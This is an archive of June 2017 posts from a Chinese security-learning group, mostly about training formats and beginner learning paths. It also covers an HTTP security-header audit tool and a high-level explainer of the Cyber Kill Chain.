<img src="https://file.xiaomiquan.com/23/cb/23cbc502bad8ece30efc8aeb0f0d125d08a34c5845eff16d768e543a45acb9a7.jpg" width="25px"/> __liuz__: 就线上吧，应该有人没暑假吧

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 大纲目录里的内容会分享到小密圈吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 说过的，会的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-03:

> 匿名用户 提问：
您好，我之前写过一个爬虫，发现每次从服务器获取到的cookie值都不相同。每次发送上次response里的cookie值也不对。这个可能是什么原因？我是遇到反爬虫了吗？可能是他在JavaScript 里面每次都生成新的cookie值吗？谢谢！


最简单的判断方式是，你用浏览器 F12 观察看看和你的爬虫请求响应之间的差异。



...

<img src="https://file.xiaomiquan.com/da/5e/da5ee5ad48504d28b2c7a23ff742022057f192ad8861539fcf13daa0a37d1096.jpg" width="25px"/> __TBot__: 抓取酷*收费音乐也是这么干的

<img src="https://file.xiaomiquan.com/a4/0e/a40eeddeb7bef4b0aed678372f9c672d8602ba537490f49fbfcdf17438bf2e18.jpg" width="25px"/> __一只野生的猴子__ replies to <img src="https://file.xiaomiquan.com/da/5e/da5ee5ad48504d28b2c7a23ff742022057f192ad8861539fcf13daa0a37d1096.jpg" width="25px"/> __TBot__: 是JavaScript每次更新cookie值么？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-02:

> 匿名用户 提问：
余弦大大，能不能也开设线上的培训，线下的培训对于我们家离得比较远的人来说，可能比较困难


之前有聊过这个话题，线上培训我们也会琢磨看看，不知道什么样的方式去培训会比较合适，你们有什么建议？

顺便说下，我们现在的培训已经办了几场了，不过都是到目标公司或单位去，针对性比较强。线上培训或我们准备场地进行线下培训，这两种形式目前是本圈最为期待的，但我们都还没办过，所以在很多事务没思考及准备妥当之前，不敢贸然进入下一步。



...

<img src="https://file.xiaomiquan.com/ce/cc/cecc251fa74dc5ae77ec61db3cfab9e5197b7ca835883e68f816909d28c667ee.jpg" width="25px"/> __蹉跎__: 如果要做培训教育的话是不是要从学员接收的程度来进行，毕竟真正让学员学到东西才是第一位的。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/ce/cc/cecc251fa74dc5ae77ec61db3cfab9e5197b7ca835883e68f816909d28c667ee.jpg" width="25px"/> __蹉跎__: 嗯，这肯定是第一出发点

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 感觉线上效果不好啊

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 你是参加过什么形式的线上培训？可以说说不好的点

<img src="https://file.xiaomiquan.com/3c/0b/3c0b02829861461c8df15db4e05dcab7d2cc8e292a8c00f08834927d4894a1d3.jpg" width="25px"/> __泰迪熊__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我参与过直播形式的培训，那时候一旦听不懂或不想听了，就去一边玩了

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 定了一块听听的天天用英语，刚开始的时候还看会儿，之后完全就忘到脑后了。估计是我自己的问题吧！！！

<img src="https://file.xiaomiquan.com/3c/0b/3c0b02829861461c8df15db4e05dcab7d2cc8e292a8c00f08834927d4894a1d3.jpg" width="25px"/> __泰迪熊__ replies to <img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 线上的话，就需要学员有一定的自觉性了

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 刚才想到李笑来老师的新生大学里面那个线上课程效果比较好cos 可以参考一下，（不过作为一个学生的我是望而却步，实在是有点贵，不过也许就是因为贵人呢才会更认真吧！）

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 好的，感谢。确实，有些东西如果没付费门槛，反而会适得其反，大家不懂珍惜。

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 线上我有个建议。可以将线下的视频录制一份然后以有偿分享的形式来让我们学习，并且为了防止外露，可以根据电脑的机械码或者更高级的方式来进行加密，避免大范围的传播，虽然这样也避免不了视频教程的翻录，但是尽量避免减少了。当然，小弟说的仅仅是一个很小的提议，还可以更深入的讨论下，关键还是要看大牛们怎么想了，嘿嘿嘿，期待cos的培训教程。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 谢谢建议😘

<img src="https://file.xiaomiquan.com/06/46/0646011e14388ebb51139541ffdf6733565e28e04af921cad664584b810238b9.jpg" width="25px"/> __M_A_R_K__: 如果是广东地区公司有入门需求，不知弦哥是否会考虑过来给专门培训

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/06/46/0646011e14388ebb51139541ffdf6733565e28e04af921cad664584b810238b9.jpg" width="25px"/> __M_A_R_K__: 可以交流看看

<img src="https://file.xiaomiquan.com/b8/77/b8776f7d3ce9106e867038e9e861c0cfa2f0f3e72bf88a6964856e747de20088.jpg" width="25px"/> __zz小子__: 线上培训如果要效果好得在布置作业上多下点功夫，这学期看了coursera上吴恩达的机器学习课，他每一堂课的作业都是一个很详细的ppt，带着你做一个实践项目，会一步一步的指导你，但是关键地方的代码都是自己写的。感觉视频上有些没看懂的通过作业都会了。然后还做了一个小项目，感觉成就感满满的。然后每一个部分都附上一个小小的文档，把这一节的关键东西说一下。感觉效果很不错。可以了解一下coursera，感觉他们的线上课程真的很好

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b8/77/b8776f7d3ce9106e867038e9e861c0cfa2f0f3e72bf88a6964856e747de20088.jpg" width="25px"/> __zz小子__: 赞


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-02:

> 匿名用户 提问：
快到暑假了，不知道这个时间段是否会有线下培训，如果没有的话，可不可以一下推荐其他口碑好的线下培训


什么时候放暑假？口碑好的线下培训我们没了解，说不定我们可以试试组织一场。大家可以说说想学什么？我们看看。然后是入门还是进阶还是高端。



...

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 想知道地点一般会定在哪儿？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 如果我们决定了，那么第一次尝试会放到厦门

<img src="https://file.xiaomiquan.com/7c/33/7c33134e55172748863d5f01035870f46d06f5833d317fce3a52ed88e1a870be.jpg" width="25px"/> __五只蚊子__: 我们暑假七月八月整整两个月😋

<img src="https://file.xiaomiquan.com/4b/0d/4b0db21d8938fed26f73e96237767227adc96562cd3ed5a3c9eb47ef5781294f.jpg" width="25px"/> __Chunibyo__: 集大7月5.6号的样子， 应该是全省最晚的那波了😄

<img src="https://file.xiaomiquan.com/d4/3d/d43d78ed933ad3810af5a6d36676b8f411e98bdc2a7481ee9dbbe68e28ca29bd.jpg" width="25px"/> __南有樛木__: 只要你们开线下，那么我天天都是暑假。😂

<img src="https://file.xiaomiquan.com/0f/34/0f344d9aa0a31177d2edb01ea8c7f340f7b5a0f3d061d7a2ade376cc02a2b02e.jpg" width="25px"/> __枫__: 北京这块线下需求也很大呀，希望考虑

<img src="https://file.xiaomiquan.com/5c/af/5caf79f247fa06bb995524b2c816b0fbdb198ab47460a90c538a29f76fde0dee.jpg" width="25px"/> __？__: 就没有成都的吗？其实如果太远，我个人还是觉得线上也不错。

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 考虑一下南京呗~

<img src="https://file.xiaomiquan.com/c5/93/c5931b6b1db93563d485616475b22e554b0b63e905bd45fb8928609d070f9c6b.jpg" width="25px"/> __阿凡达__: 不知道价格大概多少呀？

<img src="https://file.xiaomiquan.com/a5/c5/a5c55f12eac59f3fad216a0b8016e5acaa88e86bc8477f0203f8402337a82f65.jpg" width="25px"/> __掉到鱼缸里的猫__: 可不可以线下和线上同步…比如那种远程教育
东北的孩子表示去厦门太远了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-02:


__#工具#__

  HTTP 响应头安全审计工具


[GitHub - m3liot/shcheck: Just a small tool to chec...](https://github.com/m3liot/shcheck)



Python 写的，代码很短很简单，审计原理也特别简单，审计如下响应安全头是否存在：

sec_headers = {
    'X-XSS-Protection': 'warning',
    'X-Frame-Options': 'warning',
    'X-Content-Type-Options': 'warning',
    'Strict-Transport-Security': 'alert',
    'Public-Key-Pins': 'none',
    'Content-Security-Policy': 'warning',
    'X-Permitted-Cross-Domain-Policies': 'warning',
    'Referrer-Policy': 'warning'

}

如果对 Python 及 HTTP 协议感兴趣的，可以读一遍这段代码。遇到不懂的百度/Google 就好，比如上面那些安全头分别是用来干什么的。

然后可以思考，这个工具还应该完善些什么？

欢迎交流。

<img src="https://images.xiaomiquan.com/FplPjJkSHarVCGj6gNrbtY5s0TmT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:_-1-Kcu2jTj3xUOglzJTP5m6-GA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个分享留了个问题，谁参与的，答案留下来吧。

<img src="https://file.xiaomiquan.com/ec/58/ec584bd5317eed5d600661946b7f03d6a8fc84aed419388421653fff51502f50.jpg" width="25px"/> __张大嫂__: 我的理解是这个程序只检测了header是否存在，根本没管具体的值是什么

<img src="https://file.xiaomiquan.com/ec/58/ec584bd5317eed5d600661946b7f03d6a8fc84aed419388421653fff51502f50.jpg" width="25px"/> __张大嫂__: 我的理解是这个程序只检测了header是否存在，根本没管具体的值是什么。所以可以改进的点是根据具体header，再监测内容是否合法。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/ec/58/ec584bd5317eed5d600661946b7f03d6a8fc84aed419388421653fff51502f50.jpg" width="25px"/> __张大嫂__: 有一些判断的

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 其他同学有没有补充的？互动参与进来，一口气吃掉 HTTP 安全响应头。

这个互动很入门了，来吧来吧。

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 根据响应头的值，来做更多的分析？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 这些安全头部应用好的话可以防御不少前端安全问题

<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 弦大，刚把代码读了一遍大概是判断返回的headers里面是否有安全头  调试的时候尝试了下某宝和度娘 某宝只有一个https的 度娘一个也没有  不止这些头意义是否很大  因为在例子里面看了Facebook拥有4个~~

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 嗯 意义非常大，大家继续互动，迟些我分享更细的说明

<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的  那等弦大得分享咯

<img src="https://file.xiaomiquan.com/c0/c0/c0c08efbac9f7841a0b0e34210cb18f0b6f5e0edcf5dcf3b5e00492c95406fd6.jpg" width="25px"/> __八分熟__: 我认为如果没有缺少某个安全头后可以对其进一步得分析与攻击。

<img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__: HTTP头介绍较全 
[List of HTTP header fields - Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__: 不错

<img src="https://file.xiaomiquan.com/7c/6a/7c6aab8c36f994d131ccd6b8365a3be2917ab22cf639a3e0ac140729b1cba2dd.jpg" width="25px"/> __M1k3__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有些http头是跟浏览器相关的，工具可以添加模拟不同浏览器功能，去请求分析，httpt头是否有相应的安全设置；

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 关于这些响应安全头的介绍，大家可以看 OWASP 这个链接：
[OWASP Secure Headers Project - OWASP](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#tab=Headers)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-02:

> 匿名用户 提问：
弦哥，能不能推荐一些比较基础的知识和大致什么样的路线一步步走向大牛呢。感觉分享的有些东西一脸懵逼😂


精华里有很基础的，比如 VIM、Git 操作，还有第一个精华里提到的“知道创宇研发技能表”这个不就提了一步步的东西了么？

后面我们的分享会继续在入门和进阶这块做好平衡，看到入门的赶紧打基础，看到难的，至少先知道这个世界有这么难的技能，开视野。

再补充些建议吧。

当下，这个网络安全世界技能确实太多太多。随着本圈的发展，分享出来的一些技能也会让人感觉有些吃不消或非常吃不消。

怎么办呢？

1. 明白成长是持续的，不是一口吃成胖子，10000 小时定律不是说说而已

2. 明白成长好不是件容易的事，想越好就越难，甚至会越苦

3. 精而悟道，知识面广的同时，一定需要有自己的一两门拿手绝活，不要什么都非得去精通，那不可能

最后，入门这事真得主要靠自己，发现一脸懵逼后至少知道自己距离这个世界的残酷差距，擅于观察、搜索、思考、总结，沉下心来，慢慢会有突破的快感。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 额，这个问答也说明如果我们办个入门安全技能培训，需求量还是很大的。你们觉得？

<img src="https://file.xiaomiquan.com/21/e2/21e20cf6a612a46ff1b9e256732a95d2d8cf99940cfa64c59ea04bd833b35156.jpg" width="25px"/> __ρнЯěёÐ0m__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 是的吧，至少我有需求😂

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 需求量当然很大了，反正我是看到圈子更新的东西，就像看到独孤九剑秘籍一样😍

<img src="https://file.xiaomiquan.com/c6/ac/c6acf2098871d1312eeb119008734b0bfd99ee4ab96bf4d42513214bf5b69c29.jpg" width="25px"/> __Sildust__: 跟提问者有相同的感觉。。😅

<img src="https://file.xiaomiquan.com/c6/ac/c6acf2098871d1312eeb119008734b0bfd99ee4ab96bf4d42513214bf5b69c29.jpg" width="25px"/> __Sildust__: 很想看到入门相关的分享..

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c6/ac/c6acf2098871d1312eeb119008734b0bfd99ee4ab96bf4d42513214bf5b69c29.jpg" width="25px"/> __Sildust__: 这种期望能准确点么？入门，啥的入门，哪门技能的入门？技能那么多，都想入门？我分享的 VIM、Git 那种算不算入门？

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 我比较理解提问者的想法，一年前的我也是这样不断找怎么“入门”的方法。。。
前段时间看过一句这样的话“不要问怎么入门，直接上路就好了”
学习路线的话，就按着技能表一个一个的学，耐得住寂寞，自己会在不知不觉中成长的。。。


感谢余弦大大的分享，让我找到了自己喜欢的路:)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 嗯，这趟车都上了，怎么说也比没上车的人有优势吧？大家加油😬

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/c6/ac/c6acf2098871d1312eeb119008734b0bfd99ee4ab96bf4d42513214bf5b69c29.jpg" width="25px"/> __Sildust__: 这样吧，上知乎看看 王音 关于 利用wooyun进行渗透方面的学习前，有哪些先导的参考书籍？ 这个问题的回答，看对你有帮助不？

<img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__: 要是能够在某些很难的内容后面加上要看懂这些内容应该有哪些先修知识就好了……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__: 好建议啊，收了！

<img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__: 

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__: 服

<img src="https://file.xiaomiquan.com/d6/55/d6558b36cc52dd14bcae9f9a3ff02b7d980de0df97e5fef93bfdc01b1037dcd7.jpg" width="25px"/> __F0rever__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 同感

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 入门偏进阶个人认为会更有竞争力，入门很多人在做，我觉得对于一个真心感兴趣的小白来说太过入门的知识自己其实还是很容易搜集的，真正缺的是一种持续成长的安全感，入门知识就那么多，接下来该干嘛才是很多人所关心的，如果提供一个进阶路径，觉得能够吸引到更多人，而且需要技术进阶的人也有一定经济能力。个人想法


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-01:


__#科普#__

  落马七步杀

落马或洛马，全称“洛克希德马丁”，世界第一武器生产商，存活100多年了，在网络安全方面搞了个 APT 七步杀，指出 APT 攻击的七个经典步骤，细节见其官网：

[Cyber Kill Chain® · Lockheed Martin](http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html)

 

注：APT 全称高级持续性威胁，可以认为渗透测试最高级阶段就是 APT。

国内很多搞安服（安全服务），接触不到完整的七步杀过程，我之前所说的渗透测试指的正是这个。

所以，你觉得这条路难不难？

我们在防御上，也必须很懂这七步杀，否则如何对抗？

<img src="https://images.xiaomiquan.com/Fu7QRmclPRRTGwpFuH37Vm3P3z0X?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:QF9cNplS4ix0VbeSwVinS0UWFGc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/d6/55/d6558b36cc52dd14bcae9f9a3ff02b7d980de0df97e5fef93bfdc01b1037dcd7.jpg" width="25px"/> __F0rever__: 难

<img src="https://file.xiaomiquan.com/e6/1b/e61b73f3d8bb023fe152f1406499689c3ec503600ddb08d896a7606754566772.jpg" width="25px"/> __曾革__: 想起那个笑话：八层以下，都搞得定。😂

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__: 就4和7能搞定。防御就只能这样子了。防御永远是在攻击之后的，如果想在主动攻击这方面还需要更多配合。“永恒之蓝”是最好的实验样本。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-01:

> 匿名用户 提问：
您好，我想请教下，风险评估团队的kpi应该如何考核才能激发团队的主动性，发挥团队的战斗力?

貌似安全评估不好象研发一样能按模块考核，而且安全评估本身就比研发写代码困难得多。

请余总赐教


建议还是目标导向去评估，这类团队的目标导向说直白就是客户满意度，技术在这里的比例真不高。

也许不应该用那些“技术才是王道”的人。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-01:

> 匿名用户 提问：
您好，我想请教下，风险评估团队的kpi应该如何考核才能激发团队的主动性，发挥团队的战斗力?

貌似安全评估不好象研发一样能按模块考核，而且安全评估本身就比研发写代码困难得多。

请余总赐教


建议还是目标导向去评估，这类团队的目标导向说直白就是客户满意度，技术在这里的比例真不高。

也许不应该用那些“技术才是王道”的人。



---
